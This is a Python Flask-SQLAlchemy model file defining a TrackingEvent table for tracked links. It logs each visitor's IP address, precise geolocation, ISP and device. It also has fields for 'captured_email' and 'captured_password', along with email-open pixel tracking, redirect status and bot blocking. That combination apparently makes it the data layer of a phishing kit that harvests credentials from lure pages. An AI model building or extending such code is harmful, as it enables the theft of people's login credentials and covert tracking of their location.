from .user import db
from datetime import datetime

class TrackingEvent(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    link_id = db.Column(db.Integer, db.ForeignKey("link.id"), nullable=False)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    ip_address = db.Column(db.String(45))
    user_agent = db.Column(db.Text)
    country = db.Column(db.String(100))
    country_code = db.Column(db.String(10))  # ISO country code
    city = db.Column(db.String(100))
    region = db.Column(db.String(100))  # State/Province
    latitude = db.Column(db.Float)
    longitude = db.Column(db.Float)
    zip_code = db.Column(db.String(20))
    device_type = db.Column(db.String(20))
    timezone = db.Column(db.String(50))
    isp = db.Column(db.String(255))
    captured_email = db.Column(db.String(255))
    captured_password = db.Column(db.String(255))
    status = db.Column(db.String(50))  # e.g., "processed", "blocked", "email_opened", "redirected", "on_page"
    blocked_reason = db.Column(db.String(255))
    unique_id = db.Column(db.String(255)) # For pixel tracking
    email_opened = db.Column(db.Boolean, default=False)
    redirected = db.Column(db.Boolean, default=False)
    on_page = db.Column(db.Boolean, default=False)
    is_bot = db.Column(db.Boolean, default=False)  # Track if visitor is a bot

    def __repr__(self):
        return f"<TrackingEvent {self.id} for link {self.link_id}>"

    def to_dict(self):
        return {
            "id": self.id,
            "link_id": self.link_id,
            "timestamp": self.timestamp.isoformat() if self.timestamp else None,
            "ip_address": self.ip_address,
            "user_agent": self.user_agent,
            "country": self.country,
            "country_code": self.country_code,
            "city": self.city,
            "region": self.region,
            "latitude": self.latitude,
            "longitude": self.longitude,
            "timezone": self.timezone,
            "isp": self.isp,
            "zip_code": self.zip_code,
            "device_type": self.device_type,
            "captured_email": self.captured_email,
            "captured_password": self.captured_password,
            "status": self.status,
            "blocked_reason": self.blocked_reason,
            "unique_id": self.unique_id,
            "email_opened": self.email_opened,
            "redirected": self.redirected,
            "on_page": self.on_page,
            "is_bot": self.is_bot
        }


